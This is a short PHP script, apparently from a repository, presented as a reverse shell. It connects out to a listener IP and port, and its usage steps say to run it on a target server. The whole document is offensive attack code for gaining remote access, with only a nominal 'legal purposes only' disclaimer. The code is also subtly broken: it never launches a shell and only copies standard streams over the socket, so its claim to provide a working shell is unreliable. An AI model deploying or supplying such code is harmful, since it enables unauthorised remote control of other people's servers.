# reverse-shell
<?php
/**
 * php-reverse-shell - A Reverse Shell implementation in PHP
 * 
 * This script establishes an outbound TCP connection to a specified IP address and port,
 * providing a reverse shell to the listener. This tool is intended for legal purposes only.
 * Users take full responsibility for any actions performed using this tool.
 * Usage: 
 *   1. Customize the $ip and $port variables with the desired listener IP and port.
 *   2. Run the script on the target server.
 *   3. Start a listener on the specified IP and port to receive the reverse shell.
 */

// Set the IP address and port of the listener
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;        // CHANGE THIS

// Set timeout limit for script execution to indefinite
set_time_limit(0);

// Attempt to establish an outbound TCP connection to the listener
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    exit("Failed to connect to $ip:$port - $errstr ($errno)\n");
}

// Set stream options for non-blocking mode
stream_set_blocking($sock, 0);

// Print status message indicating successful connection
echo "Successfully connected to $ip:$port\n";

// Redirect STDIN, STDOUT, and STDERR to the socket
stream_copy_to_stream(STDIN, $sock);
stream_copy_to_stream($sock, STDOUT);
stream_copy_to_stream($sock, STDERR);

// Close the socket
fclose($sock);

// Exit the script
exit;
?>
